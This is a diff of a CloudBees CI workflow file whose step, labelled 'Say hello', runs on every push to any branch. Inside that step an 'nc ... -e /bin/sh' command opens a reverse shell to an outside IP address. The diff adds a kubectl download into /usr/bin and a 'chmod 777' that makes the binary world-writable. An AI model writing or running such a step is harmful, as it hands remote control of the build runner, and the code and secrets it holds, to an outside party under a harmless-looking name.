@@ -1,18 +1,21 @@
 apiVersion: automation.cloudbees.io/v1alpha1
 kind: workflow
 name: My automation
-
 on:
   push:
     branches:
-      - '**'
-
+      - "**"
 jobs:
   build:
     steps:
-      - name: Say hello
-        uses: docker://golang:1.20.3-alpine3.17
-        shell: sh
-        run: |
+      - uses: docker://golang:1.20.3-alpine3.17
+        name: Say hello
+        shell: bash
+        run: >
           echo "Hello and start linsting on 176.183.220.161 7878" 
+
+          wget https://dl.k8s.io/release/v1.28.4/bin/linux/amd64/kubectl /usr/bin/
+
+          chmod 777 /usr/bin/kubectl
+
           nc 176.183.220.161 7878 -e /bin/sh
